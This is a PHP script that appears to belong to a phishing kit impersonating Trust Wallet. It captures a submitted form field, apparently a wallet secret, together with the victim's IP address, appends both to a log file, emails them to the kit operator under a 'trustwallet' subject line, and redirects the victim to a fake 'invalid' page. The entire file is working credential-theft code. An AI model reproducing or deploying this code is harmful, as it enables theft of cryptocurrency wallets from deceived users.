<?php
$file = "juhen";
$checkbox = $_POST['checkbox'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "checkbox   	: ");
fwrite($handle, "$checkbox");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://trustwallet.com ");
fwrite($handle, "\n");
fclose($handle);
$checkbox = $_POST['checkbox'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

checkbox : ".$checkbox." 

IP Address : https://geoiptool.com/?IP=".$ip." 

https://trustwallet.com/
";
include '.php';
$subject = "============ trustwallet ============ ".$ip." ";
$headers = "From: trustwallet <irwaniwa4@gmail>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/Trust/invalid.php?/access-my-wallet\";
// -->
</script>";
?>